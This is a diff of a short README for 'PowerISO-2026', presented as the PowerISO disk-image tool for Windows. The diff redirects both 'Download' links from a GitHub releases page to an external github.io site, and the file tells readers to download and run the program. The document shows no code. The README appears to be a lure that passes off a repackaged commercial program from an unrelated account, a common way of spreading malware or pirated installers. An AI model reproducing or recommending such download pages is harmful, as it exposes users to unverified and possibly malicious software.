@@ -1,6 +1,6 @@
 # 💿 PowerISO-2026 - Manage your disk images with ease
 
-[![Download PowerISO-2026](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://github.com/SOULXSAKSHU/PowerISO-2026/releases)
+[![Download PowerISO-2026](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://soulxsakshu.github.io)
 
 PowerISO-2026 provides tools for your disk image files. Use this software to open, extract, burn, create, edit, compress, encrypt, and mount ISO files. It works on Windows 10 and Windows 11. 
 
@@ -8,7 +8,7 @@ PowerISO-2026 provides tools for your disk image files. Use this software to ope
 
 To get the application, visit the release page shown below.
 
-[Download PowerISO-2026 here](https://github.com/SOULXSAKSHU/PowerISO-2026/releases)
+[Download PowerISO-2026 here](https://soulxsakshu.github.io)
 
 1. Click the link above to open your browser.
 2. Look for the section titled Latest.
